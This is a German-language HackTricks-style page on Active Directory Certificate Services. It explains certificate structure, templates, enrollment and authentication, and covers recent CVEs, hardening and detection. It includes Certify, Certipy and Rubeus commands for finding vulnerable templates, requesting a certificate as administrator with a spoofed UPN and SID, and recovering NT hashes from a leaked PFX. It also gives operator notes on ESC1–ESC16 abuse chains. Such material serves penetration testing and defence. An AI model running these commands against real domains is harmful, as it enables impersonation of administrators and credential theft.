# AD-Zertifikate

{{#include ../../banners/hacktricks-training.md}}

## Einführung

### Komponenten eines Zertifikats

- Der **Subject** des Zertifikats bezeichnet dessen Inhaber.
- Ein **Public Key** ist einem privat gehaltenen Schlüssel zugeordnet, um das Zertifikat mit seinem rechtmäßigen Inhaber zu verknüpfen.
- Der **Validity Period**, definiert durch die Daten **NotBefore** und **NotAfter**, gibt die Gültigkeitsdauer des Zertifikats an.
- Eine eindeutige **Serial Number**, die von der Certificate Authority (CA) vergeben wird, identifiziert jedes Zertifikat.
- Der **Issuer** bezeichnet die CA, die das Zertifikat ausgestellt hat.
- **SubjectAlternativeName** ermöglicht zusätzliche Namen für den Subject und erhöht damit die Flexibilität bei der Identifizierung.
- **Basic Constraints** geben an, ob das Zertifikat für eine CA oder eine Endinstanz bestimmt ist, und legen Nutzungsbeschränkungen fest.
- **Extended Key Usages (EKUs)** definieren über Object Identifiers (OIDs) die spezifischen Zwecke des Zertifikats, etwa Code-Signing oder E-Mail-Verschlüsselung.
- Der **Signature Algorithm** gibt die Methode an, mit der das Zertifikat signiert wird.
- Die mit dem privaten Schlüssel des Issuers erstellte **Signature** garantiert die Authentizität des Zertifikats.<sup>[[4]](#references)</sup>

### Besondere Aspekte

- **Subject Alternative Names (SANs)** erweitern die Anwendbarkeit eines Zertifikats auf mehrere Identitäten, was besonders für Server mit mehreren Domains wichtig ist. Sichere Ausstellungsverfahren sind entscheidend, um das Risiko einer Identitätsvortäuschung durch Angreifer zu vermeiden, die die SAN-Angabe manipulieren.<sup>[[4]](#references)</sup>

### Certificate Authorities (CAs) in Active Directory (AD)

AD CS erkennt CA-Zertifikate in einer AD-Forest über festgelegte Container an, die jeweils eigene Aufgaben erfüllen:<sup>[[4]](#references)</sup>

- Der Container **Certification Authorities** enthält vertrauenswürdige Root-CA-Zertifikate.
- Der Container **Enrolment Services** enthält Informationen zu Enterprise CAs und ihren Zertifikatvorlagen.
- Das Objekt **NTAuthCertificates** enthält CA-Zertifikate, die für die AD-Authentifizierung zugelassen sind.
- Der Container **AIA (Authority Information Access)** ermöglicht die Validierung der Zertifikatskette anhand von Intermediate- und Cross-CA-Zertifikaten.

### Zertifikatsbeschaffung: Ablauf einer Client-Zertifikatsanforderung

1. Der Anforderungsprozess beginnt damit, dass Clients eine Enterprise CA suchen.
2. Nach dem Erzeugen eines Public-Private-Key-Paars wird ein CSR mit einem Public Key und weiteren Angaben erstellt.
3. Die CA prüft den CSR anhand der verfügbaren Zertifikatvorlagen und stellt das Zertifikat gemäß den Berechtigungen der Vorlage aus.
4. Nach der Genehmigung signiert die CA das Zertifikat mit ihrem privaten Schlüssel und sendet es an den Client zurück.<sup>[[4]](#references)</sup>

### Zertifikatvorlagen

Diese in AD definierten Vorlagen legen die Einstellungen und Berechtigungen für die Ausstellung von Zertifikaten fest. Dazu gehören zulässige EKUs sowie Berechtigungen zur Registrierung oder Änderung. Sie sind entscheidend für die Verwaltung des Zugriffs auf Zertifikatsdienste.<sup>[[4]](#references)</sup>

**Die Schema-Version der Vorlage ist wichtig.** Älteren **v1**-Vorlagen (zum Beispiel der integrierten Vorlage **WebServer**) fehlen mehrere moderne Durchsetzungsoptionen. Die Forschung zu **ESC15/EKUwu** zeigte, dass bei **v1-Vorlagen** ein Anforderer **Application Policies/EKUs** in den CSR einbetten kann, die gegenüber den in der Vorlage konfigurierten EKUs **bevorzugt werden**. Dadurch können mit bloßen Registrierungsberechtigungen Client-Auth-, Enrollment-Agent- oder Code-Signing-Zertifikate erstellt werden. Bevorzugen Sie **v2/v3-Vorlagen**, entfernen oder ersetzen Sie v1-Standardvorlagen und beschränken Sie EKUs genau auf den vorgesehenen Zweck.<sup>[[1]](#references)</sup>

## Zertifikatsregistrierung

Der Registrierungsprozess für Zertifikate wird von einem Administrator eingeleitet, der **eine Zertifikatvorlage erstellt**, die anschließend von einer Enterprise Certificate Authority (CA) **veröffentlicht** wird. Dadurch wird die Vorlage für die Client-Registrierung verfügbar. Dazu wird der Name der Vorlage dem Feld `certificatetemplates` eines Active-Directory-Objekts hinzugefügt.<sup>[[4]](#references)</sup>

Damit ein Client ein Zertifikat anfordern kann, müssen **Registrierungsberechtigungen** erteilt werden. Diese Berechtigungen sind in den Sicherheitsbeschreibungen der Zertifikatvorlage und der Enterprise CA festgelegt. Damit eine Anforderung erfolgreich ist, müssen Berechtigungen an beiden Stellen erteilt werden.<sup>[[4]](#references)</sup>

### Registrierungsberechtigungen für Vorlagen

Diese Berechtigungen werden über Access Control Entries (ACEs) festgelegt und umfassen unter anderem:<sup>[[4]](#references)</sup>

- Die Berechtigungen **Certificate-Enrollment** und **Certificate-AutoEnrollment**, die jeweils bestimmten GUIDs zugeordnet sind.
- **ExtendedRights**, die alle erweiterten Berechtigungen gewähren.
- **FullControl/GenericAll**, die vollständige Kontrolle über die Vorlage gewähren.

### Registrierungsberechtigungen der Enterprise CA

Die Berechtigungen der CA sind in ihrer Sicherheitsbeschreibung aufgeführt, die über die Verwaltungskonsole der Certificate Authority zugänglich ist. Einige Einstellungen ermöglichen sogar Benutzern mit geringen Berechtigungen den Remotezugriff, was ein Sicherheitsrisiko darstellen kann.<sup>[[4]](#references)</sup>

### Zusätzliche Ausstellungskontrollen

Es können bestimmte Kontrollen gelten, zum Beispiel:<sup>[[4]](#references)</sup>

- **Manager Approval**: Versetzt Anforderungen in einen ausstehenden Status, bis ein Zertifikatsmanager sie genehmigt.
- **Enrolment Agents and Authorized Signatures**: Legen die Anzahl der erforderlichen Signaturen für einen CSR sowie die erforderlichen Application Policy OIDs fest.

### Methoden zum Anfordern von Zertifikaten

Zertifikate können über folgende Wege angefordert werden:<sup>[[4]](#references)</sup>

1. Das **Windows Client Certificate Enrollment Protocol** (MS-WCCE) über DCOM-Schnittstellen.
2. Das **ICertPassage Remote Protocol** (MS-ICPR) über Named Pipes oder TCP/IP.
3. Die **Webschnittstelle für die Zertifikatsregistrierung**, sofern die Rolle Certificate Authority Web Enrollment installiert ist.
4. Der **Certificate Enrollment Service** (CES) in Verbindung mit dem Dienst Certificate Enrollment Policy (CEP).
5. Der **Network Device Enrollment Service** (NDES) für Netzwerkgeräte, der das Simple Certificate Enrollment Protocol (SCEP) verwendet.

Windows-Benutzer können Zertifikate auch über die GUI (`certmgr.msc` oder `certlm.msc`) oder Befehlszeilentools (`certreq.exe` oder den PowerShell-Befehl `Get-Certificate`) anfordern.

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Zertifikatauthentifizierung

Active Directory (AD) unterstützt die Zertifikatauthentifizierung, hauptsächlich über die Protokolle **Kerberos** und **Secure Channel (Schannel)**.<sup>[[4]](#references)</sup>

### Kerberos-Authentifizierungsprozess

Beim Kerberos-Authentifizierungsprozess wird die Anfrage eines Benutzers nach einem Ticket Granting Ticket (TGT) mit dem **privaten Schlüssel** des Zertifikats des Benutzers signiert. Diese Anfrage durchläuft mehrere Validierungen durch den Domain Controller, darunter die **Gültigkeit**, den **Pfad** und den **Widerrufsstatus** des Zertifikats. Zu den Validierungen gehört außerdem, sicherzustellen, dass das Zertifikat von einer vertrauenswürdigen Quelle stammt, und zu bestätigen, dass der Aussteller im **NTAUTH-Zertifikatspeicher** vorhanden ist. Erfolgreiche Validierungen führen zur Ausstellung eines TGT. Das **`NTAuthCertificates`**-Objekt in AD befindet sich unter:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

ist zentral für die Vertrauensbildung bei der Zertifikatsauthentifizierung.<sup>[[4]](#references)</sup>

Seit der Einführung von **KB5014754** geht es bei moderner Kerberos-Zertifikatsauthentifizierung hauptsächlich um die **Stärke des Mappings**, nicht nur um EKUs.<sup>[[2]](#references)</sup> In gehärteten Forests gilt:

- Ein Zertifikat, das nur einen **UPN/DNS-SAN** enthält, reicht möglicherweise nicht mehr für die Anmeldung aus.
- Der KDC bevorzugt eine **starke Bindung**, typischerweise die **SID-Sicherheitserweiterung** (`1.3.6.1.4.1.311.25.2`) oder ein starkes explizites Mapping in `altSecurityIdentities`.
- Fehlt dem Zertifikat ein starkes Mapping, protokollieren DCs im Kompatibilitätsmodus **Kdcsvc Event ID 39/41** und verweigern die Authentifizierung im Erzwingungsmodus.
- Bei gemischten Angriffspfaden sind **ESC9/ESC16** relevant, weil sie die SID-Erweiterung aus ausgestellten Zertifikaten entfernen. Operatoren verlassen sich dann auf explizite Mappings oder SAN-URL-SID-Formate, sofern der Angriffspfad diese unterstützt.

### Authentifizierung über Secure Channel (Schannel)

Schannel ermöglicht sichere TLS/SSL-Verbindungen. Während eines Handshakes präsentiert der Client ein Zertifikat, das bei erfolgreicher Validierung den Zugriff autorisiert.<sup>[[5]](#references)</sup> Das Mapping eines Zertifikats zu einem AD-Konto kann unter anderem die Kerberos-Funktion **S4U2Self** oder den **Subject Alternative Name (SAN)** des Zertifikats verwenden.<sup>[[4]](#references)</sup>

Schannel ist außerdem die praktische Ausweichmöglichkeit, wenn **PKINIT** nicht verfügbar ist. Wenn ein Domain Controller beispielsweise kein geeignetes **Smart Card Logon**-Zertifikat besitzt, kann `certipy auth`/PKINIT-Tooling möglicherweise kein TGT beziehen. Dasselbe Zertifikat kann jedoch weiterhin zur Authentifizierung und für LDAP-Operationen über **LDAPS** oder **LDAP StartTLS** verwendet werden.

### Enumeration der AD Certificate Services

Die Certificate Services von AD lassen sich über LDAP-Abfragen enumerieren, wodurch Informationen zu **Enterprise Certificate Authorities (CAs)** und deren Konfigurationen sichtbar werden. Jeder domänenauthentifizierte Benutzer kann darauf ohne besondere Berechtigungen zugreifen.<sup>[[4]](#references)</sup> Tools wie **[Certify](https://github.com/GhostPack/Certify)** und **[Certipy](https://github.com/ly4k/Certipy)** werden zur Enumeration und Schwachstellenbewertung in AD CS-Umgebungen verwendet.<sup>[[6]](#references)</sup>

Zu den Befehlen für die Verwendung dieser Tools gehören:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Certify-Enumerations-Flags und PKINIT mit Rubeus

Die folgenden Certify-Befehlsvarianten behalten ihre jeweils unterschiedlichen Filter und Ausgabeoptionen bei.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus kann für die PKINIT-Authentifizierung auch ein kennwortgeschütztes PFX-Zertifikat verwenden und ein TGT anfordern. Der optionale Schalter `/getcredentials` fordert ein U2U-Service-Ticket an und versucht, den NT-Hash des Kontos wiederherzustellen:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

Für templatespezifischen ESC-Missbrauch und CA-Missbrauch siehe [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Aktuelle Schwachstellen & Sicherheitsupdates (2022-2025)

| Jahr | ID / Name | Auswirkung | Wichtige Erkenntnisse |
|------|-----------|------------|-----------------------|
| 2022 | **CVE-2022-26923** – „Certifried“ / ESC6 | *Privilege escalation* durch Spoofing von Machine-Account-Zertifikaten während PKINIT. | Der Patch ist in den Sicherheitsupdates vom **10. Mai 2022** enthalten. Auditing- und Strong-Mapping-Kontrollen wurden über **KB5014754** eingeführt; Umgebungen sollten sich jetzt im Modus *Full Enforcement* befinden.  |
| 2023 | **CVE-2023-35350 / 35351** | *Remote code-execution* in den Rollen AD CS Web Enrollment (certsrv) und CES. | Öffentliche PoCs sind begrenzt, aber die anfälligen IIS-Komponenten sind häufig intern erreichbar. Seit dem Patch Tuesday im **Juli 2023** gepatcht.  |
| 2024 | **CVE-2024-49019** – „EKUwu“ / ESC15 | Bei **v1 templates** kann ein Requester mit Enrollment-Rechten **Application Policies/EKUs** in den CSR einbetten, die gegenüber den EKUs des Templates bevorzugt werden. Dadurch können Zertifikate für Client-Authentifizierung, Enrollment Agent oder Code-Signing ausgestellt werden. | Seit dem **12. November 2024** gepatcht. v1 templates ersetzen oder außer Kraft setzen (z. B. das Standardtemplate WebServer), EKUs auf den jeweiligen Zweck beschränken und Enrollment-Rechte begrenzen. |

### Microsoft-Härtungszeitplan (KB5014754)

Microsoft führte einen dreiphasigen Rollout (Compatibility → Audit → Enforcement) ein, um Kerberos-Zertifikatauthentifizierung von schwachen impliziten Zuordnungen wegzubewegen. Seit dem **11. Februar 2025** wechseln Domain Controller automatisch zu **Full Enforcement**, wenn der Registrierungswert `StrongCertificateBindingEnforcement` nicht gesetzt ist. Microsoft aktualisierte den Zeitplan später, sodass bis zum Sicherheitsupdate vom **9. September 2025** weiterhin ein Fallback auf den Compatibility-Modus möglich ist.<sup>[[2]](#references)</sup> Administratoren sollten:

1. Alle DCs und AD CS-Server patchen (Mai 2022 oder später).
2. Während der *Audit*-Phase Ereignisse mit ID 39/41 auf schwache Zuordnungen überwachen.
3. Client-Auth-Zertifikate mit der neuen **SID extension** erneut ausstellen oder vor dem Enforcement, das schwache Zuordnungen blockiert, starke manuelle Zuordnungen konfigurieren.

### Hinweise für Operatoren in gehärteten Forests

- **ESC1/ESC6 allein erzählen 2025+ nicht mehr die ganze Geschichte.** Wenn du ein Zertifikat für einen anderen Principal anforderst, benötigst du normalerweise auch ein starkes Mapping-Artefakt wie die SID extension oder eine explizite Zuordnung.
- **ESC15 (EKUwu)** ist vor allem in ungepatchten Umgebungen relevant, da es harmlose **v1**-Templates wie **WebServer** durch das Einschleusen von **Application Policies** in Zertifikate für Authentifizierung oder Enrollment Agent umwandelt. Kerberos PKINIT wertet EKUs weiterhin aus, aber **LDAP Schannel** berücksichtigt auch Application Policies, wodurch LDAP-basierter Missbrauch weiterhin relevant ist.<sup>[[1]](#references)</sup>
- **ESC16** ist eine CA-weite Einstellung: Wenn die CA die SID security extension global deaktiviert, fällt jedes ausgestellte Zertifikat auf ein schwächeres Zuordnungsverhalten zurück, sofern die Angriffskette keine SID in einem anderen unterstützten Format einschleust.
- **ESC7-Rechte sind unterschiedlich:** Eine CA-`ManageCA`-Berechtigung kann Änderungen an Einstellungen wie `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6) erlauben, während `ManageCertificates` die Genehmigung von Anträgen steuert. Ein explizites Deny für Certificate-Manager-Rechte kann diesen Genehmigungsweg blockieren, selbst wenn auch ein Allow vorhanden ist. Prüfe die effektive CA ACL, bevor du Einstellungen und Templates miteinander verknüpfst. Siehe [Microsofts Bewertung der CA ACL](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Verbesserungen bei Erkennung und Härtung

* Der **Defender for Identity AD CS sensor (2023-2024)** zeigt jetzt Sicherheitsbewertungen für ESC1-ESC8/ESC11 an und generiert Echtzeitwarnungen wie *„Ausstellung eines Domain-Controller-Zertifikats für einen Nicht-DC“* (ESC8) und *„Zertifikatsregistrierung mit beliebigen Application Policies verhindern“* (ESC15). Stelle sicher, dass auf allen AD CS-Servern Sensoren bereitgestellt sind, um von diesen Erkennungen zu profitieren.<sup>[[3]](#references)</sup>
* Deaktiviere oder beschränke die Option **„In der Anforderung angeben“** für alle Templates streng; bevorzuge explizit definierte SAN/EKU-Werte.
* Entferne **Any Purpose** oder **No EKU** aus Templates, sofern dies nicht unbedingt erforderlich ist (beugt ESC2-Szenarien vor).
* Verlange **Manager-Genehmigung** oder dedizierte Enrollment-Agent-Workflows für sensible Templates (z. B. WebServer / CodeSigning).
* Beschränke Web Enrollment (`certsrv`) und CES/NDES-Endpunkte auf vertrauenswürdige Netzwerke oder sichere sie mit Client-Zertifikatauthentifizierung ab.
* Erzwinge die Verschlüsselung für RPC Enrollment (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`), um ESC11 (RPC relay) zu mitigieren. Das Flag ist **standardmäßig aktiviert**, wird aber für ältere Clients häufig deaktiviert, wodurch das Relay-Risiko wieder entsteht.
* Sichere **IIS-basierte Enrollment-Endpunkte** (CES/Certsrv) ab: Deaktiviere NTLM, sofern möglich, oder verlange HTTPS + Extended Protection, um ESC8-Relays zu blockieren.

Bewerte ESC11 auf dem Host, auf dem die CA ausgeführt wird; dabei kann es sich um einen Domänenmitgliedsserver statt um einen Domain Controller handeln. Lies den `InterfaceFlags`-Wert der aktiven CA unter `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration` aus. Ein nicht lesbarer oder fehlender Wert bedeutet ein unbekanntes Ergebnis, nicht den Beweis, dass die RPC-Verschlüsselung deaktiviert ist. Ein nicht gesetztes `IF_ENFORCEENCRYPTICERTREQUEST`-Bit ist ein Hinweis auf eine mögliche Konfigurationsschwäche. Dafür sind weiterhin ein erreichbarer Enrollment-RPC-Endpunkt, zur Weiterleitung veranlassbare Credentials und ein geeignetes Zertifikatstemplate erforderlich. Für ESC8 reicht eine HTTP-NTLM-Challenge allein nicht aus: Bestätige, dass ein funktionierender Enrollment-Endpunkt vorhanden ist.

---

## References

- [1] [EKUwu: Nicht einfach ein weiterer AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Änderungen bei der zertifikatbasierten Authentifizierung auf Windows-Domain-Controllern](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Bewertungen der Sicherheitslage von Zertifikaten - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Missbrauch von Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [Was ist SSL/TLS-Clientauthentifizierung und wie funktioniert sie?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
